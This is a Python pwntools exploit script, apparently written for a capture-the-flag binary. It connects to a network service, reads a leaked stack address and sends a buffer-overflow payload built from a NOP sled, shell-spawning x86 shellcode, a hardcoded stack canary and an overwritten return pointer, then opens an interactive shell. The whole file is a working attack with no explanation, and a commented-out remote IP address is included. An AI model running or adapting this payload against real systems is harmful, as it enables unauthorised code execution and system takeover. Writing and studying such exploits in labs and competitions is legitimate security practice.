#!/usr/bin/env python
import re
import struct
import sys
from pwn import *

BUFFER_SIZE = 128
STACK_SPACE = "\x90"*12
BYTES_TO_PASS_RPTR = 152
BYTES_TO_COOKIE = 128

#SHELL_CODE_EXIT = "\xb0\x01\x31\xdb\xcd\x80"
#SHELL_CODE_HELLO = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"

SHELL_CODE = "\x31\xc0\xb0\x30" +\
            "\x01\xc4\x30\xc0" +\
            "\x50\x68\x2f\x2f" +\
            "\x73\x68\x68\x2f" +\
            "\x62\x69\x6e\x89" +\
            "\xe3\x89\xc1\xb0" +\
            "\xb0\xc0\xe8\x04" +\
            "\xcd\x80\xc0\xe8" +\
            "\x03\xcd\x80"

SLED = "\x90"*12
REMAINING_BUFF = "\x90"*(BUFFER_SIZE-len(SHELL_CODE)-len(SLED))

def makeShellWord(number):
	return struct.pack('<I',number)

CANARY = makeShellWord(0x475a31a5)+makeShellWord(0x40501555)

def makePayloadString(offset):
	offset = int(offset,16)
	shell_ptr = makeShellWord(offset)

	payload_str = SLED + SHELL_CODE + REMAINING_BUFF + \
		CANARY + STACK_SPACE + shell_ptr
	
	return payload_str

if __name__ == "__main__":
	#server_address = '54.173.98.115
	#port = 1259
	server_address = 'localhost'
	port = 1259

	sock = remote(server_address, port, timeout=None)
	data = sock.recv(16)
	print data[6::]
	
	payload = makePayloadString(data[6::])
	sock.sendline(payload)
	sock.interactive()